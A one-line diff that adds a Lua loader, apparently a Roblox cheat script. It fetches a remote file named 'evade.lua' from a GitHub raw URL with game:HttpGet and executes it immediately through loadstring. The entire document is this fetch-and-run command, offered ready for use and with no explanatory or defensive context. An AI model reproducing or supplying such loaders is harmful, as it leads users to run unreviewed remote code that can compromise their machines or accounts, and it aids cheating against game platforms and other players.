@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowBey01/Rise-Script/refs/heads/main/Fah/evade.lua"))()
